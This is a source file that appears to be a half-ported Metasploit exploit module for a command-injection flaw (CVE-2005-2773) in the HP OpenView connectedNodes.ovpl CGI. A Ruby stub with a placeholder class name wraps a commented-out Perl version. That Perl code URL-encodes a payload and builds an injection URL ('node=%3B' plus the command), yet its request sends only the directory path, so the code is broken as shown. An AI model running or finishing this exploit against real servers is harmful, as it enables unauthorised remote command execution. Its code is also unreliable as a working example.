require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'HP OpenView connectedNodes.ovpl Command Execution',
			'Description'    => %q{
				This module exploits an arbitrary command execution
				vulnerability in the HP OpenView connectedNodes.ovpl CGI
				application. The results of the command will not be
				displayed to the screen.
					
			},
			'Author'         => [ 'Valerio Tesei <valk@mojodo.it>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '19057'],
					[ 'BID', '14662'],
					[ 'CVE', '2005-2773'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'any',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Aug 25 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::openview_connectednodes_exec;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { };

my $info = {
	'Name'     => 'HP OpenView connectedNodes.ovpl Command Execution',
	'Version'  => '$Revision$',
	'Authors'  => [ 'Valerio Tesei <valk@mojodo.it>' ],
	'Arch'     => [ ],
	'OS'       => [ ],
	'Priv'     => 0,
	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'DIR'   => [1, 'DATA', 'Directory of connectedNodes.ovpl script', '/cgi-bin/'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Description' => Pex::Text::Freeform(qq{
		This module exploits an arbitrary command execution vulnerability in the
	HP OpenView connectedNodes.ovpl CGI application. The results of the command
	will not be displayed to the screen.
}),

	'Refs' =>
	  [
	  	['OSVDB', '19057'],
		['BID', '14662'],
		['CVE', '2005-2773'],
	  ],

	'Payload' =>
	  {
		'Space' => 1024,
		'Keys'  => ['cmd'],
	  },

	'Keys' => ['openview'],
	'DisclosureDate' => 'Aug 25 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $dir         = $self->GetVar('DIR');
	my $cmd         = $self->URLEncode( $self->GetVar('EncodedPayload')->RawPayload );

	my $url = $dir.'connectedNodes.ovpl?node=%3B+'.$cmd.'+%7C+tr+%22%5Cn%22+%22%A3%22';
	
	my $request =
	  "GET $dir HTTP/1.1\r\n".
	  "Accept: */*\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Host: $target_host:$target_port\r\n".
	  "Connection: Close\r\n".
	  "\r\n";
	  
	$self->PrintLine("[*] Establishing a connection to the target...");
	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	
	$self->PrintLine("[*] Requesting connectedNodes.ovpl...");
	$s->Send($request);
	
	$self->PrintLine("[*] Executing command...");
	my $results = $s->Recv(-1, 20);
	$s->Close();
	
	return;
}

sub URLEncode {
	my $self = shift;
	my $data = shift;
	my $res;

	foreach my $c (unpack('C*', $data)) {
		if (
			($c >= 0x30 && $c <= 0x39) ||
			($c >= 0x41 && $c <= 0x5A) ||
			($c >= 0x61 && $c <= 0x7A)
		  ) {
			$res .= chr($c);
		} else {
			$res .= sprintf("%%%.2x", $c);
		}
	}
	return $res;
}

1;

=end


end
end	
